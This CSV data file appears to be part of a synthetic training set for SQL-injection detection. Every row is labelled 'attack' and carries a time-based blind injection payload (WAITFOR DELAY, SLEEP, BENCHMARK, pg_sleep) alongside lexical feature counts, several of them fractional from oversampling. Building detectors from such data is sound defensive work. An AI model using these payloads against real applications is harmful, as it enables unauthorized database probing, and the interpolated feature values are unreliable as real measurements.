id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000154,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000223,1.1512702766200034,65.45976362177528,29.0,4.092189031816754,23.0,12.0,21.0,9.459763621775279,0.3513812206757969,0.18332933252650274,0.32082633192137977,0.14446311487632066,2.0,0.4597636217752792,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.45976362177527924,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000155,attack,time,waitfor delay '0:0:5' and '%'  =  ',nearest_attack_euclidean,R000257,1.171806965028537,37.115539324820496,19.0,3.824806310414097,17.41775922836628,3.0,8.0,8.697780096454215,0.46454998851735535,0.0813968585207745,0.21705828938873198,0.23699486357313815,5.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.6977800964542151,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000212,0.5195306517575713,69.07360905937378,28.277603397265167,3.7957669533951317,24.0,9.759201132421722,26.796005662108612,8.518402264843445,0.3483642706405162,0.1413295751862742,0.3873139611775644,0.12299219299564511,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.7592011324217225,0.0,1.0,0.7592011324217227,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000157,attack,time,"1'   )    )    as fusi where 2788  =  2788 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000246,0.4528583765064275,107.80325743397944,31.196742566020557,3.8334204027118597,28.78697026408222,27.0,40.62280203785612,11.39348513204111,0.2670908255771422,0.25045967889257137,0.376732935952001,0.10571655957828538,1.3934851320411101,0.0,0.0,0.0,0.0,2.0,0.0,5.803257433979445,0.0,0.0,1.0,2.196742566020555,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.19674256602055512,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.196742566020555
SMOTE_000158,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000136,0.8573377724321872,85.60465456289478,22.003324687781987,3.1196766181332922,32.205984438007576,1.8006649375563963,40.398670124887204,11.199335062443602,0.37519574582876963,0.020897778799082903,0.4727727181536488,0.13113375721849868,0.199335062443603,0.0,1.6013298751127945,0.0,1.0,1.1102230246251565e-16,0.0,8.199335062443602,0.0,0.0,-5.551115123125783e-17,2.8006649375563972,0.19933506244360272,0.0,0.8006649375563972,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000159,attack,time,1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,nearest_attack_euclidean,R000205,0.7890315801069898,100.29637396287684,24.703626037123158,3.283732135990224,40.29637396287684,2.0,46.0,12.0,0.4017606374032288,0.019941312086559027,0.45865017799085794,0.11964787251935424,1.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,9.0,0.0,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,0.0,1.0,0.2963739628768428,0.7036260371231572,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000160,attack,time,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",nearest_attack_euclidean,R000177,0.1012004027873819,114.85258401899513,30.085258401899512,3.636127772640072,30.0,22.0,48.6820672151961,14.170516803799025,0.2613485059019628,0.1916555709947727,0.42365815150117353,0.1233377716020909,0.0,4.0,0.0,0.0,0.0,1.0,0.0,8.170516803799025,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000161,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000300,0.41395152760654685,102.82035169101769,27.72711773635588,3.66832477034542,26.0,22.0,41.27458716372945,13.545764527288242,0.2537472830994494,0.21470923954568794,0.399840061227366,0.13170341612749675,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.545764527288242,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,time,"1"" rlike sleep  (  5  )  ",nearest_attack_euclidean,R000141,0.7530692221675668,25.346362937304747,13.346362937304749,3.084629973628777,9.999999999999998,2.0,10.0,3.3463629373047477,0.39486869722511486,0.07897373944502298,0.39486869722511486,0.1312888661047473,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.1731814686523735,0.0,-5.551115123125783e-17,0.0,0.0,1.0,0.0,0.17318146865237355,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000163,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000115,0.1346933945599207,70.18505451602167,27.861209112983754,3.8537790867180104,16.046263629005416,20.90747274198917,24.185054516021662,9.046263629005415,0.22862501578649275,0.29799941063760366,0.34450048411911127,0.1288750894567923,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0462636290054155,1.0,0.0,1.0,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.9537363709945847,0.04626362900541531,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000202,0.4340050237252059,24.0,17.83139761740192,4.034155496603743,12.000000000000002,4.0,3.0,5.0,0.5,0.16666666666666666,0.125,0.20833333333333334,2.1686023825980785,0.8313976174019214,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.8313976174019213,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,time,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",nearest_attack_euclidean,R000177,0.5654717211850613,118.3870694630553,30.53225578858794,3.5928671809255626,30.0,22.0,51.322557885879405,15.064511577175882,0.25551515452486623,0.1873777799849019,0.4301872006385443,0.12691986485168746,0.0,4.0,0.0,0.0,0.0,1.0,0.0,9.064511577175882,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000166,attack,time,1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000170,1.6077408065602834,119.0553093047697,31.98156356507677,3.983935696194827,43.0,18.0,42.03687286984646,16.01843643492323,0.3614062817901995,0.15128635051682768,0.35288756929843146,0.13441979839454138,3.5092182174616164,0.0,0.9815635650767671,0.0,0.0,2.0,0.0,5.509218217461616,0.0,1.0,-5.551115123125783e-17,6.0,1.0,0.0,0.49078178253838356,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000167,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,0.5192320838588526,57.80487142924994,21.0,3.3290247334806686,14.804871429249946,10.0,25.0,8.0,0.2560827197391856,0.17300401866530568,0.43251004666326415,0.13840321493224453,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.8048714292499473,0.19512857075005288,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,time,"1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000302,0.12847960406189063,105.21162049053058,31.92945983648981,3.913722681001371,31.71783934595924,27.0,35.49378114457133,11.0,0.30155214070800196,0.25663899883207003,0.33725223130612164,0.10455662915380633,1.0,0.0,0.0,0.0,0.0,2.0,0.0,5.07054016351019,0.0,0.0,1.0,2.92945983648981,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9294598364898099,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.92945983648981
SMOTE_000169,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.19208656188428722,116.34663789230785,29.893865515692312,4.030818301418477,59.62025170400008,3.946932757846157,35.93865515692314,16.84079827353847,0.5123206724327403,0.0341369439306371,0.3074990088489177,0.14604337478770485,4.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,5.787731031384628,0.0,0.05306724215384295,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000170,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000093,0.9748930125334222,36.738931839699354,20.49683766848553,3.9941237022260077,16.987350673942117,3.0,8.0,8.751581165757235,0.45814509931461483,0.08216544522510336,0.21910785393360893,0.2405816015266728,2.0,3.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7515811657572351,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000171,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000300,0.013795910921269253,99.0,28.0,3.7249463523868847,26.0,22.0,38.0,13.0,0.26262626262626265,0.2222222222222222,0.3838383838383838,0.13131313131313133,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000172,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",nearest_attack_euclidean,R000295,0.8344231165154465,91.71297708008979,30.35763359496633,4.0135746325041515,31.07061067505612,20.501145054921434,29.927099215101013,10.214122135011223,0.3384314794050291,0.22487727428355483,0.32533736633974797,0.11135387997166804,3.785877864988776,0.0,0.0,0.0,0.0,0.7858778649887762,0.0,4.6423664050336715,0.0,0.0,1.0,0.7858778649887763,1.0,0.0,0.0,0.0,0.0,0.7858778649887763,1.0,0.0,0.0,1.0,0.0,0.2141221350112238,0.0,0.0,0.0,1.7858778649887759,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000173,attack,time,"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000215,0.5046562093781366,101.66287190663802,27.831435953319012,3.738175423837564,28.0,27.0,37.247153929978516,9.415717976659506,0.27568885061242,0.26584282023340494,0.36600481521841505,0.09246351393576002,0.20785898832975258,0.0,0.0,0.0,0.0,2.0,0.0,5.207858988329753,0.0,0.0,1.0,2.0,0.20785898832975264,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000174,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000180,0.014498120359785817,46.95097521734701,21.993463362312934,4.075916502223892,24.957511855034074,4.0,9.990195043469399,8.003268318843533,0.5314020457133818,0.08523676803897073,0.2127855152058456,0.17057567104180188,3.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.003268318843533055,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,time,waitfor delay '0:0:5'# ogzq,nearest_attack_euclidean,R000173,0.8703243026418606,24.9767399483175,18.651159965545,4.109849353161086,14.651159965545,3.0,2.662789991386248,4.66278999138625,0.5854558728335714,0.12181619074964285,0.10575857129184524,0.18696936512494047,2.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.6627899913862499,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,time,1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000077,1.9556529088986734,66.0,27.77323313815836,4.202080648249925,25.364310850877814,12.0,16.862456010963825,11.77323313815836,0.3843077401648154,0.18181818181818182,0.25549175774187616,0.17838232027512668,4.182155425438908,0.0,2.0,0.0,0.0,1.0,0.0,1.408922287280546,0.0,0.0,-5.551115123125783e-17,4.182155425438907,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.5910777127194538,0.5910777127194538,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5910777127194535
SMOTE_000177,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""azzv"" like ""azzv",nearest_attack_euclidean,R000161,0.2962395493246239,81.0,27.86729685233324,4.078601152647534,35.0,15.0,23.0,8.0,0.43209876543209874,0.18518518518518517,0.2839506172839506,0.09876543209876543,0.1990547215001397,2.8009452784998605,0.0,0.0,0.0,1.1102230246251565e-16,0.0,4.0,0.0,0.0,1.0,0.0,0.06635157383337986,0.9336484261666201,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000178,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.032509559359816045,61.85766424916956,20.0,2.9888737036916786,13.0,10.85766424916956,30.0,8.0,0.21016667497641345,0.1754999674002241,0.4850000191763388,0.12933333844702366,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,6.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000179,attack,time,waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,nearest_attack_euclidean,R000240,0.9043518104717745,40.39036092771112,20.540103122203178,3.9799607848090557,21.160412488812707,3.0,8.0,8.229948438898411,0.5202442334644748,0.07471354912712017,0.19923613100565377,0.20580608640275125,5.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.22994843889841177,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000180,attack,time,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000293,0.0466707914059653,86.0,25.0,3.4607382187689972,21.0,18.0,36.0,11.0,0.2441860465116279,0.20930232558139536,0.4186046511627907,0.12790697674418605,0.014214759816745026,0.985785240183255,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.014214759816744915,0.985785240183255,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000181,attack,time,1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000126,0.09087440800847695,109.96758467334325,33.837923366716225,3.8782253388799433,34.96758467334325,18.0,42.0,15.0,0.3179790534195783,0.16368502717930122,0.38193173008503617,0.13640418931608433,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,-5.551115123125783e-17,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,1.0,1.0,0.967584673343245,0.03241532665675495,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000182,attack,time,"select benchmark  (  5000000,md5  (  0x714e4153   )    )   #",nearest_attack_euclidean,R000216,1.0503848713292534,64.04863229066696,25.934299759384682,3.8334138236142006,19.0,17.868599518769365,20.868599518769365,6.311433253128229,0.29910410650167296,0.27747439599897045,0.32470136018344514,0.0987201373159114,0.0,0.0,0.0,0.0,0.0,0.3114332531282279,0.0,4.0,0.0,0.0,1.0,0.31143325312822756,0.0,0.0,0.0,1.0,0.0,0.3114332531282278,1.0,0.0,0.0,1.0,0.0,0.6885667468717721,0.0,0.0,0.0,0.3114332531282278,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000183,attack,time,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000153,0.1421994961930917,107.20751367809348,28.10375683904674,3.7114123871805136,34.0,18.0,42.0,13.207513678093475,0.31715206507286475,0.16790403445034016,0.39177608038412703,0.123167820092668,2.207513678093476,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,-5.551115123125783e-17,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000184,attack,time,1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000119,0.27881073661572,59.75469062328813,24.25067008904116,4.03401360422556,23.0,12.0,16.504020534246962,8.25067008904116,0.38584671503033774,0.20131132958104575,0.2747779394262605,0.13806401596235604,2.0,0.0,2.0,0.0,0.0,1.0,0.0,1.2506700890411602,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
